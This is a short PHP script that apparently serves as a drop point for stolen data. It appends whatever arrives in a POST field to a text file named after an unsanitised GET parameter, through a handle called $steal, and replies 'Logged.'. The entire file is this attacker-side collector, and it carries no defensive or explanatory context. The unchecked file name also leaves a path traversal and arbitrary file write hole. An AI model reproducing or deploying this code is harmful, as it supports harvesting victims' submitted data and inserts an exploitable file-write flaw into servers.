<?php
//error_reporting(0);
$data = $_POST['message'];
$username = $_GET['username'];
$steal = fopen($username.'.txt', "a");
if($data){
	fwrite($steal, "th3data---".$data."\n");
}
fclose($steal);
echo 'Logged.';
?>
